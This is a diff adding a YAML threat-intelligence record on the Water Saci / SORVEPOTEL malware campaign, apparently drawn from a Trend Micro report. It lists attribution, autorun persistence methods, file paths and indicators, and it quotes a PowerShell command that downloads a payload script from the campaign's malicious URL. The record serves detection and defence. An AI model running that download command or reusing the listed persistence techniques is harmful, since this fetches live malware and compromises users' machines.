@@ -1,0 +1,56 @@
+description: "Water\u202FSaci campaign uses an email\u2011based C&C infrastructure\
+  \ via IMAP connections to terra.com.br accounts and a multi\u2011vector persistence\
+  \ strategy."
+attribution: Brazilian threat actors (Water Saci / Coyote)
+malware_families:
+- SORVEPOTEL
+- "Water\u202FSaci"
+TTPs:
+  processes: []
+  commandline: []
+  powershell:
+  - New-Object Net.WebClient | Invoke-WebRequest -Uri https://miportuarios.com/sisti/config.php
+    -OutFile tadeu.ps1
+  scripting_engine:
+  - Orcamento.vbs
+  - tadeu.ps1
+  registry_keys:
+  - UserInitMprLogonScript
+  - Software\\Microsoft\\Windows\\CurrentVersion\\Run
+  - Startup (BAT script)
+  - ProgramData\\WinManagers.vbs
+  image_load: []
+  network_connections:
+  - process: ''
+    destination: terra.com.br
+    port: IMAP
+  file_activity:
+  - C:\\temp\\Bin.zip
+  - C:\\ProgramData\\WindowsManager\\WinManagers.vbs
+  - Orcamento*.zip
+  - Bin.zip
+  - WinManagers.vbs
+  persistence:
+  - Registry modifications for autorun (Run key)
+  - Scheduled task creation (WinManagers.vbs in ProgramData)
+  - WMI-based mutex mechanism via wscript.exe/cscript.exe enumeration
+  - UserInitMprLogonScript registry key
+  - Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key
+  - BAT script in Startup folder
+  - Scheduled task creation (WinManagers.vbs)
+  process_relations: []
+IOCs:
+  hashes: []
+  ips: []
+  domains:
+  - miportuarios.com
+  - terra.com.br
+  urls:
+  - https://miportuarios.com/sisti/config.php
+authors:
+- Jeffrey Francis Bonaobra
+- Joe Soares
+- Emmanuel Panopio
+reference: https://www.trendmicro.com/en_us/research/25/j/active-water-saci-campaign-whatsapp-update.html
+date_of_publication: October 27, 2025
+file_creation_date: October 30, 2025
